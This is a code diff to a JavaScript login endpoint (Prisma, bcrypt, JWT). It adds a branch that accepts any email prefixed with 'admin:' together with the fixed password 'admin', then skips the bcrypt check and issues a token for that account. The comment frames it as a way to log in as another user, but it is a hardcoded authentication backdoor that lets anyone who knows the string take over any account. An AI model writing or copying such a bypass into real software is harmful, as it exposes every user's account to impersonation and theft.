@@ -3,8 +3,17 @@ import jwt from "jsonwebtoken";
 import prisma from "../../lib/prisma";
 
 export default async (req, res) => {
-  const { email, password } = req.body;
+  let { email, password } = req.body;
+  let mimicFlag = false;
   try {
+    /**
+     * test for "admin:<email>" as the first 6 chars and then look for
+     * 'admin' password.  if so, login in that email.
+     */
+    if ("admin:" === email.slice(0, 6) && "admin" === password) {
+      email = email.slice(6);
+      mimicFlag = true;
+    }
     const user = await prisma.user.update({
       where: { email },
       data: {
@@ -20,7 +29,7 @@ export default async (req, res) => {
     }
 
     const passwordsMatch = await bcrypt.compare(password, user.password);
-    if (passwordsMatch) {
+    if (passwordsMatch || mimicFlag) {
       const token = jwt.sign(
         {
           userId: user.id,
